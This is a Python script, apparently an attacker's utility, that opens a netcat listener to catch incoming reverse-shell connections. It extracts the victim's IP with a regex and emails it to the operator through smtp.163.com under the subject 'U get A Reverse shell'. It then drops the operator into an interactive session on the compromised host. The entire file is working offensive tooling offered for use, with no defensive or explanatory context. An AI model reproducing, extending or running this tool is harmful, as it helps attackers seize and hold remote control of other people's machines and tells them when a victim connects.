#!/usr/bin/python3
# author : n00B & khan Team
import pexpect,smtplib,re  #, pdb
from sys import argv
from email.mime.text import MIMEText

GREEN = "\033[0;32m"
none = "\033[0m"


def run(Port):
        process = pexpect.spawn("nc",['-lvp',Port])
#        pdb.set_trace()
        process.expect_exact("connect")
        string =  str(process.before)
        ip = re.search(r'((25[0-5]|2[0-4]\d|((1\d{2})|([1-9]?\d)))\.){3}(25[0-5]|2[0-4]\d|((1\d{2})|([1-9]?\d)))',string,re.M|re.I)
        if ip is not None:
            print(ip.group())
            em4il(ip)
            process.interact()

def em4il(ip):
    msg_from = "xxxxx@xx.com"                   #sender
    password = "xxxxx"                          #sender 's password
    msg_to = "xxxx@xx.com"                      #receiver
    subject = "U get A Reverse shell"
    IPS =str(ip)
    content = "U get a Reverse Shell  [ "+IPS+" ]  in Ur VPS \nU get a Reverse Shell  [ "+IPS+" ]  in Ur VPS \nU get a Reverse Shell  [ "+IPS+" ]  in Ur VPS \nU get a Reverse Shell  [ "+IPS+" ]  in Ur VPS \nU get a Reverse Shell  [ "+IPS+" ]  in Ur VPS \n"
    msg = MIMEText(content)
    msg['Subject'] = subject
    msg['From'] = msg_from
    msg['To'] = msg_to

    try:
        s = smtplib.SMTP('smtp.163.com',25)     #163's smtp
        s.login(msg_from,password)
        s.sendmail(msg_from , msg_to , msg.as_string())
        print(GREEN + "[*]---------sucess" + none + '\n')

    except smtplib.SMTPException as e :
       print(GREEN+ "[!]---------failed" + format(e) + none + "\n")

    finally:
       s.quit()


def main(): 
    if len(argv)!=2 or argv[1] == '-h' or argv[1] == '--help':
        print( GREEN +"[!]Usage: {} [PORT] ".format(argv[0]))
        print(none+"\n")
        exit()

    Port = argv[1]
    run(Port)


if __name__ == '__main__':
    main()
